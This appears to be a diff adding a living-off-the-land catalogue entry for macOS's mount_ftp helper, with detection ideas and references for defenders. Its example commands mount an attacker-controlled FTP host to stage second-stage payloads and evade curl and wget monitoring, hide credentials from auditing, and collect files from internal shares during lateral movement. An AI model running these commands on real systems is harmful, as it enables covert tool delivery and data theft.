@@ -1,0 +1,62 @@
+name: mount_ftp
+author: Hare Sudhan (@cyb3rbuff)
+short_description: Mount a remote FTP server directory as a read-only local filesystem.
+full_description: |
+  mount_ftp is the macOS mount helper for the FTP filesystem. It attaches a remote FTP server directory at a
+  local mount point, after which the remote files appear under /Volumes (or any chosen node) and can be read
+  with ordinary file operations. The mount is always read-only - the helper forces the rdonly option because
+  it does not allow files to be opened for writing on the server. For an operator this is a native,
+  install-nothing way to stage remote tooling onto a host: a second-stage binary or script hosted on an FTP
+  server becomes a local file that can be copied and run, without invoking curl, wget, or a custom
+  downloader. It is normally invoked by the higher-level mount command (mount -t ftp) or by the Finder's
+  "Connect to Server", but can be run directly. Credentials, if required, are passed inside the ftp:// URL,
+  where they are exposed in the process arguments.
+created: 2026-09-20
+example_use_cases:
+  - name: Stage remote tooling onto a host without a downloader utility
+    description: >-
+      Mounting an attacker-controlled FTP directory makes its files readable locally, so a second-stage
+      payload or toolkit hosted there can be copied off the mount and run. This ingress path uses a native
+      mount helper instead of curl or wget, which some monitoring watches for. The mount is read-only, so it
+      is an inbound staging technique, not a way to write to the server. The mount point must already exist.
+    code: mount_ftp ftp://<ATTACKER_HOST>/tools /Volumes/mnt
+    tactics:
+      - Command and Control
+    tags: []
+  - name: Prompt for credentials at mount time to keep them off the command line
+    description: >-
+      The -i (interactive) option makes mount_ftp prompt for the username and password instead of taking them
+      from the URL, so the credentials for an authenticated FTP drop do not appear in the process arguments or
+      shell history where command-line auditing would capture them. The remote directory is then readable at
+      the mount point.
+    code: mount_ftp -i ftp://<ATTACKER_HOST>/tools /Volumes/mnt
+    tactics:
+      - Command and Control
+      - Defense Evasion
+    tags: []
+  - name: Read files from an internal FTP server discovered during lateral movement
+    description: >-
+      Given credentials or anonymous access to an internal FTP server reached from a compromised host, an
+      operator can mount its directory and browse and copy its contents as local files, collecting data from
+      a network share without an FTP client. Access is read-only. The mount point must already exist.
+    code: mount_ftp ftp://user:<PASSWORD>@<INTERNAL_HOST>/share /Volumes/mnt
+    tactics:
+      - Lateral Movement
+      - Collection
+    tags:
+      - shares
+paths:
+  - /sbin/mount_ftp
+  - /System/Library/Filesystems/ftp.fs/Contents/Resources/mount_ftp
+detections:
+  - name: "Process execution of mount_ftp (or mount -t ftp) with an ftp:// URL pointing at an external or unexpected host, which is uncommon on managed macOS endpoints and consistent with inbound tool staging."
+    url: N/A
+  - name: "Command-line argument capture of an ftp:// URL containing an embedded username and password (ftp://user:pass@host), exposing credentials in the process arguments."
+    url: N/A
+  - name: "Creation of a new FTP-backed mount under /Volumes followed by reads of executable files from that mount point."
+    url: N/A
+resources:
+  - name: "mount_ftp(8) manual page"
+    url: https://keith.github.io/xcode-man-pages/mount_ftp.8.html
+  - name: "MITRE ATT&CK T1105: Ingress Tool Transfer"
+    url: https://attack.mitre.org/techniques/T1105/
